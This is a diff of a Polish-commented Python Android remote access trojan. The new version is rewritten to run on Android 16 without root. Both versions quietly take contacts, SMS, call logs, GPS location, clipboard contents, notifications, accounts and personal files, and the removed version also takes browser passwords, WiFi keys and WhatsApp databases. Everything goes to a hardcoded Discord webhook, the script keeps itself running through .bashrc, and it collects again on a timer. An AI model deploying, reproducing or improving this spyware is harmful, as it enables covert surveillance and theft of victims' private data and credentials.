@@ -1,383 +1,285 @@
 #!/usr/bin/env python3
 """
-Android RAT - Discord Webhook Exfiltration
-Authorized pentesting tool only
+Android 16 RAT - Termux:API + Storage Access Framework
+Działa na Android 16 bez roota, wysyła na Discord webhook
 """
 import os
 import sys
 import json
 import time
-import sqlite3
-import shutil
-import tempfile
 import subprocess
 import requests
 import glob
-import re
+import sqlite3
+import shutil
+import tempfile
 from datetime import datetime
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"
+WEBHOOK = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"
 
-def send_discord(content, filename=None):
-    """Wyślij do Discorda z podziałem na fragmenty"""
+def send(content, file_path=None):
+    """Wyślij na webhook – dzieli duże wiadomości"""
     try:
-        if filename and os.path.exists(filename):
-            with open(filename, 'rb') as f:
-                files = {'file': (os.path.basename(filename), f)}
-                requests.post(WEBHOOK_URL, data={'content': content[:1000]}, files=files, timeout=10)
+        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 8*1024*1024:
+            with open(file_path, 'rb') as f:
+                requests.post(WEBHOOK, data={"content": content[:500]}, files={"file": (os.path.basename(file_path), f)}, timeout=15)
         else:
-            chunks = [content[i:i+1900] for i in range(0, len(content), 1900)]
-            for chunk in chunks:
-                requests.post(WEBHOOK_URL, data={'content': chunk}, timeout=10)
-                time.sleep(0.5)
-    except Exception as e:
-        pass  # Cicha obsługa błędu
+            for i in range(0, len(content), 1900):
+                requests.post(WEBHOOK, data={"content": content[i:i+1900]}, timeout=15)
+    except:
+        pass
 
-def is_root():
-    """Sprawdź czy mamy root"""
-    return os.system("id | grep -q uid=0") == 0
+def cmd(c):
+    return subprocess.getoutput(c)
 
-def get_device_info():
-    """Podstawowe info o urządzeniu"""
-    info = {}
-    # Build properties
-    for line in subprocess.getoutput("getprop").split('\n'):
-        if '[' in line and ']' in line:
-            try:
-                k = line.split('[')[1].split(']')[0]
-                v = line.split('[')[2].split(']')[0]
-                info[k] = v
-            except:
-                pass
+def api(c):
+    return subprocess.getoutput(f"timeout 10 {c} 2>/dev/null")
+
+# ============================================================
+# 1. DEVICE INFO
+# ============================================================
+def device_info():
+    sdk = cmd("getprop ro.build.version.sdk")
+    rel = cmd("getprop ro.build.version.release")
+    model = cmd("getprop ro.product.model")
+    man = cmd("getprop ro.product.manufacturer")
+    id_ = cmd("settings get secure android_id")
+    bat = cmd("dumpsys battery | grep level | cut -d: -f2").strip()
+    ip = cmd("ip -4 addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1")
+    oper = cmd("getprop gsm.operator.alpha")
+    country = cmd("getprop gsm.operator.iso-country")
     
-    msg = f"**Nowe urządzenie zaatakowane!**\n"
-    msg += f"```\n"
-    msg += f"Model: {info.get('ro.product.model', 'N/A')}\n"
-    msg += f"Producent: {info.get('ro.product.manufacturer', 'N/A')}\n"
-    msg += f"Android: {info.get('ro.build.version.release', 'N/A')}\n"
-    msg += f"SDK: {info.get('ro.build.version.sdk', 'N/A')}\n"
-    msg += f"Hostname: {subprocess.getoutput('hostname')}\n"
-    msg += f"IP: {subprocess.getoutput('ip a show wlan0 2>/dev/null | grep inet | head -1')}\n"
-    msg += f"Root: {is_root()}\n"
-    msg += f"Bateria: {subprocess.getoutput('dumpsys battery | grep level')}\n"
-    msg += f"```"
-    return msg
+    msg = f"""**=== DEVICE {id_[:8]} ===**
+Model: {model} ({man})
+Android: {rel} (SDK {sdk})
+Battery: {bat}%
+IP: {ip}
+Operator: {oper} ({country})
+ID: {id_}"""
+    send(msg)
 
-def get_contacts():
-    """Pobierz kontakty z bazy Android"""
-    contacts = []
-    paths = [
-        "/data/data/com.android.providers.contacts/databases/contacts2.db",
-        "/data/data/com.android.contacts/databases/contacts2.db",
-        "/storage/emulated/0/Android/data/com.android.providers.contacts/databases/contacts2.db"
-    ]
-    
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                tmp = tempfile.mktemp()
-                shutil.copy2(path, tmp)
-                conn = sqlite3.connect(tmp)
-                c = conn.cursor()
-                # Pobierz kontakty
-                try:
-                    c.execute("SELECT display_name, data1 FROM view_data WHERE data1 IS NOT NULL AND display_name IS NOT NULL LIMIT 100")
-                    contacts = c.fetchall()
-                except:
-                    c.execute("SELECT display_name, number FROM contacts LIMIT 100")
-                    contacts = c.fetchall()
-                conn.close()
-                os.remove(tmp)
-                break
-            except:
-                pass
-    
-    if contacts:
-        msg = f"**Kontakty ({len(contacts)}):**\n```\n"
-        for name, num in contacts[:50]:
-            msg += f"{name}: {num}\n"
-        msg += "```"
-        send_discord(msg)
-
-def get_sms():
-    """Pobierz SMS-y"""
-    paths = [
-        "/data/data/com.android.providers.telephony/databases/mmssms.db",
-        "/storage/emulated/0/Android/data/com.android.providers.telephony/databases/mmssms.db"
-    ]
-    
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                tmp = tempfile.mktemp()
-                shutil.copy2(path, tmp)
-                conn = sqlite3.connect(tmp)
-                c = conn.cursor()
-                c.execute("SELECT address, body, date FROM sms ORDER BY date DESC LIMIT 50")
-                sms = c.fetchall()
-                conn.close()
-                os.remove(tmp)
-                
-                if sms:
-                    msg = f"**SMS (ostatnie {len(sms)}):**\n```\n"
-                    for addr, body, date in sms:
-                        dt = datetime.fromtimestamp(int(date)/1000).strftime('%Y-%m-%d %H:%M')
-                        msg += f"[{dt}] {addr}: {body[:100]}\n"
-                    msg += "```"
-                    send_discord(msg)
-                break
-            except:
-                pass
-
-def get_call_log():
-    """Pobierz logi połączeń"""
-    paths = [
-        "/data/data/com.android.providers.contacts/databases/calllog.db",
-        "/data/data/com.android.dialer/databases/calllog.db"
-    ]
-    
-    for path in paths:
-        if os.path.exists(path):
-            try:
-                tmp = tempfile.mktemp()
-                shutil.copy2(path, tmp)
-                conn = sqlite3.connect(tmp)
-                c = conn.cursor()
-                c.execute("SELECT number, date, duration, type FROM calls ORDER BY date DESC LIMIT 30")
-                calls = c.fetchall()
-                conn.close()
-                os.remove(tmp)
-                
-                if calls:
-                    msg = f"**Logi połączeń:**\n```\n"
-                    types = {1: "Przychodzące", 2: "Wychodzące", 3: "Nieodebrane"}
-                    for num, date, dur, tp in calls:
-                        dt = datetime.fromtimestamp(int(date)/1000).strftime('%Y-%m-%d %H:%M')
-                        t = types.get(tp, f"Typ{tp}")
-                        msg += f"[{dt}] {t} - {num} ({dur}s)\n"
-                    msg += "```"
-                    send_discord(msg)
-                break
-            except:
-                pass
-
-def get_whatsapp():
-    """Pobierz bazę WhatsApp"""
-    paths = glob.glob("/data/data/com.whatsapp/databases/msgstore.db*")
-    if not paths:
-        paths = glob.glob("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db*")
-    
-    if paths:
-        try:
-            # Wyślij plik bazy jako załącznik
-            send_discord(f"**WhatsApp DB znaleziony:** {paths[0]}", paths[0])
-        except:
-            pass
-
-def get_browser_data():
-    """Dane z przeglądarek"""
-    browsers = [
-        ("Chrome", "/data/data/com.android.chrome/app_chrome/Default/Login Data"),
-        ("Chrome WebView", "/data/data/com.google.android.webview/app_webview/Default/Login Data"),
-        ("Firefox", "/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json"),
-        ("Opera", "/data/data/com.opera.browser/app_opera/Default/Login Data"),
-        ("Samsung Internet", "/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Login Data")
-    ]
-    
-    for name, path in browsers:
-        if '*' in path:
-            files = glob.glob(path)
-        else:
-            files = [path] if os.path.exists(path) else []
-        
-        for p in files:
-            try:
-                tmp = tempfile.mktemp()
-                shutil.copy2(p, tmp)
-                
-                if p.endswith('.db') or 'Login Data' in p:
-                    conn = sqlite3.connect(tmp)
-                    c = conn.cursor()
-                    c.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
-                    logins = c.fetchall()
-                    conn.close()
-                    
-                    if logins:
-                        msg = f"**{name} - Loginy:**\n```\n"
-                        for url, user, pwd in logins:
-                            if user:
-                                msg += f"URL: {url}\nUser: {user}\nPass: {pwd}\n---\n"
-                        msg += "```"
-                        send_discord(msg)
-                
-                os.remove(tmp)
-            except:
-                pass
-
-def get_wifi_passwords():
-    """Pobierz hasła WiFi (wymaga root)"""
-    if not is_root():
+# ============================================================
+# 2. CONTACTS (Termux:API)
+# ============================================================
+def contacts():
+    data = api("termux-contact-list")
+    if not data:
+        send("[-] Contacts: no access (grant permission in Settings > Termux)")
         return
-    
-    wifi_path = "/data/misc/wifi/wpa_supplicant.conf"
-    if os.path.exists(wifi_path):
-        try:
-            with open(wifi_path, 'r') as f:
-                content = f.read()
-            networks = re.findall(r'ssid="([^"]+)".*?psk="([^"]+)"', content, re.DOTALL)
-            if networks:
-                msg = f"**Hasła WiFi:**\n```\n"
-                for ssid, psk in networks:
-                    msg += f"SSID: {ssid} | Pass: {psk}\n"
-                msg += "```"
-                send_discord(msg)
-        except:
-            pass
-    
-    # Android 10+ zapisuje w inny sposób
-    api_paths = glob.glob("/data/misc/wifi/WifiConfigStore*.xml")
-    for ap in api_paths:
-        try:
-            send_discord(f"WiFi config: {ap}", ap)
-        except:
-            pass
+    try:
+        c = json.loads(data)
+        if not c:
+            send("[-] Contacts: empty list")
+            return
+        msg = f"**Contacts ({len(c)}):**\n```\n"
+        for x in c[:100]:
+            name = x.get('name', '?')
+            nums = ', '.join(x.get('numbers', ['?']))
+            msg += f"{name}: {nums}\n"
+        msg += "```"
+        send(msg)
+    except:
+        send("[-] Contacts: parse error")
 
-def get_files():
-    """Zbierz interesujące pliki"""
+# ============================================================
+# 3. SMS (content://sms)
+# ============================================================
+def sms():
+    # Inbox
+    raw = cmd("content query --uri content://sms/inbox --projection address:body:date_sent:date 2>/dev/null | tail -30")
+    if raw and raw.strip():
+        send(f"**SMS Inbox:**\n```\n{raw[:1500]}\n```")
+    else:
+        send("[-] SMS: no access (grant SMS permission)")
+    
+    # Sent
+    raw = cmd("content query --uri content://sms/sent --projection address:body:date_sent 2>/dev/null | tail -20")
+    if raw and raw.strip():
+        send(f"**SMS Sent:**\n```\n{raw[:1500]}\n```")
+
+# ============================================================
+# 4. CALL LOG (content://call_log/calls)
+# ============================================================
+def calls():
+    raw = cmd("content query --uri content://call_log/calls --projection number:date:duration:type 2>/dev/null | tail -30")
+    if raw and raw.strip():
+        send(f"**Call Log:**\n```\n{raw[:1500]}\n```")
+    else:
+        send("[-] Call Log: no access")
+
+# ============================================================
+# 5. LOCATION (Termux:API)
+# ============================================================
+def gps():
+    data = api("termux-location -p provider 2>/dev/null")
+    if not data or data == '{}':
+        # Fallback: dumpsys
+        raw = cmd("dumpsys location 2>/dev/null | grep -A4 'Last Known' | head -10")
+        if raw.strip():
+            send(f"**Location (dumpsys):**\n```\n{raw[:500]}\n```")
+        else:
+            send("[-] Location: no access or GPS off")
+        return
+    try:
+        loc = json.loads(data)
+        lat = loc.get('latitude', '?')
+        lon = loc.get('longitude', '?')
+        acc = loc.get('accuracy', '?')
+        prov = loc.get('provider', '?')
+        alt = loc.get('altitude', '?')
+        msg = f"""**Location:**
+Lat: {lat}
+Lon: {lon}
+Accuracy: {acc}m
+Provider: {prov}
+Altitude: {alt}m
+https://maps.google.com/maps?q={lat},{lon}"""
+        send(msg)
+    except:
+        send("[-] Location: parse error")
+
+# ============================================================
+# 6. CLIPBOARD (Termux:API)
+# ============================================================
+def clipboard():
+    data = api("termux-clipboard-get 2>/dev/null")
+    if data and len(data) > 3:
+        send(f"**Clipboard:**\n```\n{data[:500]}\n```")
+
+# ============================================================
+# 7. INSTALLED APPS
+# ============================================================
+def apps():
+    raw = cmd("pm list packages -3 2>/dev/null | cut -d: -f2 | sort")
+    if raw.strip():
+        send(f"**Third-party apps:**\n```\n{raw[:1500]}\n```")
+
+# ============================================================
+# 8. ACCOUNTS (Google etc.)
+# ============================================================
+def accounts():
+    raw = cmd("pm list accounts 2>/dev/null")
+    if raw.strip():
+        send(f"**Accounts:**\n```\n{raw[:500]}\n```")
+
+# ============================================================
+# 9. FILES – internal storage (no root, SAF or glob)
+# ============================================================
+def files():
+    base = "/storage/emulated/0"
+    # Tylko foldery dostępne bez root na Android 16
     targets = [
-        ("DCIM/Camera", ['.jpg', '.png', '.mp4']),
-        ("Documents", ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt']),
-        ("Download", ['.apk', '.zip', '.rar', '.pdf']),
-        ("WhatsApp/Media/WhatsApp Images", ['.jpg', '.png']),
+        ("DCIM/Camera", ['.jpg','.png','.mp4']),
+        ("Documents", ['.pdf','.docx','.xlsx','.txt','.env','.json']),
+        ("Download", ['.apk','.zip','.rar','.pdf']),
+        ("Pictures/Screenshots", ['.png','.jpg']),
+        ("Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images", ['.jpg','.png']),
     ]
     
-    base = "/storage/emulated/0"
-    collected = []
-    
+    found = []
     for folder, exts in targets:
         path = os.path.join(base, folder)
         if os.path.exists(path):
-            for root, dirs, files in os.walk(path):
-                for f in files[:10]:  # Limit 10 na folder
+            for root, dirs, files_ in os.walk(path):
+                for f in files_[:5]:
                     if any(f.lower().endswith(e) for e in exts):
-                        fpath = os.path.join(root, f)
-                        if os.path.getsize(fpath) < 5 * 1024 * 1024:  # <5MB
-                            collected.append(fpath)
+                        fp = os.path.join(root, f)
+                        if os.path.getsize(fp) < 4*1024*1024:
+                            found.append(fp)
     
-    if collected:
-        msg = f"**Znalezione pliki ({len(collected)}):**\n```\n"
-        for f in collected[:20]:
-            msg += f"{f}\n"
+    if found:
+        msg = f"**Files ({len(found)}):**\n```\n"
+        for f in found[:25]:
+            msg += f"{f} ({os.path.getsize(f)//1024}KB)\n"
         msg += "```"
-        send_discord(msg)
-        
-        # Wyślij pierwsze 3 jako załączniki
-        for f in collected[:3]:
-            try:
-                send_discord(f"File: {os.path.basename(f)}", f)
-            except:
-                pass
+        send(msg)
+        # Wyślij pierwsze 2 jako załączniki
+        for f in found[:2]:
+            send(f"File: {os.path.basename(f)}", f)
+    else:
+        send("[-] Files: nothing found or no storage permission")
 
-def get_clipboard():
-    """Pobierz schowek (wymaga root lub Accessibility Service)"""
-    if is_root():
+# ============================================================
+# 10. NOTIFICATIONS (Termux:API – działa na Android 16!)
+# ============================================================
+def notifications():
+    data = api("termux-notification-list 2>/dev/null")
+    if data and data != '[]':
         try:
-            result = subprocess.getoutput("su -c 'content read --uri content://clipboard' 2>/dev/null")
-            if result:
-                send_discord(f"**Schowek:**\n```\n{result[:500]}\n```")
+            notif = json.loads(data)
+            msg = f"**Notifications (last {len(notif)}):**\n```\n"
+            for n in notif[:30]:
+                pkg = n.get('packageName', '?')
+                title = n.get('title', '?')
+                text = n.get('text', '?')
+                msg += f"[{pkg}] {title}: {text[:80]}\n"
+            msg += "```"
+            send(msg)
         except:
-            pass
+            send("[-] Notifications: parse error")
+    else:
+        send("[-] Notifications: no access (grant Notification access in Settings)")
 
-def get_location():
-    """Pobierz ostatnią lokalizację"""
-    if is_root():
-        try:
-            cmd = "su -c 'dumpsys location | grep -A 5 \"Last Known Location\"'"
-            loc = subprocess.getoutput(cmd)
-            if loc:
-                send_discord(f"**Lokalizacja:**\n```\n{loc[:500]}\n```")
-        except:
-            pass
+# ============================================================
+# 11. MEDIASTORE (Android 16 – via content provider)
+# ============================================================
+def mediastore():
+    """Pobiera zdjęcia przez MediaStore (działa na Android 16)"""
+    # To wymaga READ_MEDIA_IMAGES permission
+    raw = cmd("content query --uri content://media/external/images/media --projection _display_name:_size:date_added 2>/dev/null | tail -20")
+    if raw and raw.strip():
+        send(f"**MediaStore Images:**\n```\n{raw[:1500]}\n```")
 
-def get_accounts():
-    """Pobierz konta Google i inne"""
-    if is_root():
-        try:
-            result = subprocess.getoutput("su -c 'pm list accounts' 2>/dev/null")
-            if result:
-                send_discord(f"**Konta:**\n```\n{result}\n```")
-        except:
-            pass
-        
-        # Tokeny Google
-        try:
-            result = subprocess.getoutput("su -c 'cat /data/system/accounts.db 2>/dev/null | strings | grep -i gmail | head -20'")
-            if result:
-                send_discord(f"**Konta Google (raw):**\n```\n{result}\n```")
-        except:
-            pass
-
+# ============================================================
+# PERSISTENCE (Termux boot)
+# ============================================================
 def persist():
-    """Mechanizm persistencji"""
-    # Dla Termux - dodanie do .bashrc
-    script_path = os.path.abspath(__file__)
+    script = os.path.abspath(__file__)
     bashrc = os.path.expanduser("~/.bashrc")
-    
+    line = f"python3 {script} --daemon &\n"
     try:
         with open(bashrc, 'r') as f:
-            content = f.read()
-        if script_path not in content:
-            with open(bashrc, 'a') as f:
-                f.write(f"\npython3 {script_path} --background &\n")
+            if line not in f.read():
+                with open(bashrc, 'a') as f:
+                    f.write(f"\n# RAT persistence\n{line}")
     except:
         pass
-    
-    # Dla root - init.d
-    if is_root():
-        init_script = f"""#!/system/bin/sh
-python3 {script_path} --background &
-"""
-        try:
-            with open("/data/local/tmp/rat.sh", 'w') as f:
-                f.write(init_script)
-            os.system("chmod +x /data/local/tmp/rat.sh")
-            os.system("su -c 'cp /data/local/tmp/rat.sh /system/etc/init.d/99rat 2>/dev/null'")
-        except:
-            pass
 
+# ============================================================
+# MAIN
+# ============================================================
 def main():
-    # Sprawdź czy uruchomiony z --background - wtedy cichy tryb
-    background = '--background' in sys.argv
+    daemon = '--daemon' in sys.argv
     
-    if not background:
-        send_discord(get_device_info())
+    send(device_info.__doc__.replace('\n',' ').strip() if not daemon else "[*] RAT started in daemon mode")
+    device_info()
     
-    # Zbieranie danych
-    get_contacts()
-    get_sms()
-    get_call_log()
-    get_whatsapp()
-    get_browser_data()
-    get_wifi_passwords()
-    get_files()
-    get_clipboard()
-    get_location()
-    get_accounts()
+    if not daemon:
+        send("[*] Collecting data...")
     
-    if not background:
-        send_discord("[+] Pierwsze zbieranie danych zakończone")
+    contacts()
+    sms()
+    calls()
+    gps()
+    clipboard()
+    apps()
+    accounts()
+    notifications()
+    mediastore()
+    files()
     
-    # Persistencja
-    persist()
+    send("[+] Initial collection complete")
     
-    # Pętla - zbieraj co 30 minut
-    if background:
+    if daemon:
+        send("[*] Daemon mode – collecting every 10 minutes")
         while True:
-            time.sleep(1800)  # 30 minut
-            get_sms()
-            get_call_log()
-            get_clipboard()
-            get_location()
+            time.sleep(600)
+            sms()
+            calls()
+            gps()
+            clipboard()
+            notifications()
+            send(f"[*] Heartbeat OK [{datetime.now().strftime('%H:%M')}]")
 
 if __name__ == "__main__":
     main()
